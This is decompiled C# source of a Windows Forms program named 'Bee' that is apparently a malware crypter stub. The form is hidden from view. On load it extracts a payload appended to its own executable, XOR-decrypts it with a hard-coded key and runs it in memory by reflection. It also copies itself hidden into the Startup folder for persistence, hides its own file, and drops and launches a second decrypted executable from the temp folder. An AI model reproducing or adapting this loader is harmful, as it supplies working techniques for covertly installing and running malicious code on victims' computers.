using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Bee.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Bee;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		Button1 = new Button();
		TextBox1 = new TextBox();
		ProgressBar1 = new ProgressBar();
		Button2 = new Button();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(2, 3);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(51, 18);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		TextBox textBox = TextBox1;
		location = new Point(2, 24);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		TextBox1.set_Text("Fuck You Idiot");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(4, 48);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(70, 15);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		Button button3 = Button2;
		location = new Point(108, 4);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(64, 57);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(3);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(177, 66);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		byte[] bytes = (byte[])RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(Resources.Uget).GetType("Uget.ResourceReader")!.GetMethod("ReadResource")!.Invoke(null, new object[1] { Application.get_ExecutablePath() })));
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "Devide", -1, (CompareMethod)0);
		string s = CustomXOR_Encrypt(array[1], "N3oNight");
		byte[] bytes2 = Encoding.Default.GetBytes(s);
		RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(Resources.Function1).GetType("Function1.Fuck")!.GetMethod("You")!.Invoke(null, new object[1] { bytes2 })));
		string text = array[3];
		if (Conversions.ToBoolean(array[2]))
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			try
			{
				if (!File.Exists(folderPath + text))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, folderPath + text);
					File.SetAttributes(folderPath + text, FileAttributes.Hidden);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(array[4]))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		if (Conversions.ToBoolean(array[5]))
		{
			string s2 = CustomXOR_Encrypt(array[6], "N3oNight");
			byte[] bytes3 = Encoding.Default.GetBytes(s2);
			if (!File.Exists(Path.GetTempPath() + "\\" + array[7]))
			{
				File.WriteAllBytes(Path.GetTempPath() + "\\" + array[7], bytes3);
				Process.Start(Path.GetTempPath() + "\\" + array[7]);
			}
		}
		ProjectData.EndApp();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		new decimal(107375L);
		MessageBox.Show("'e‚$†zB[!†g4uE…Jr4‚d‰|V<K<~tx!dJG");
		new decimal(19L);
		while (true)
		{
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	public string CustomXOR_Encrypt(string Input, string pass)
	{
		StringBuilder stringBuilder = new StringBuilder();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
		checked
		{
			int num = Input.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + Input.Substring(i, 2)) ^ array[num2])));
				stringBuilder.Append(value);
				num2 = ((num2 != pass.Length - 1) ? (num2 + 1) : 0);
			}
			return stringBuilder.ToString();
		}
	}
}
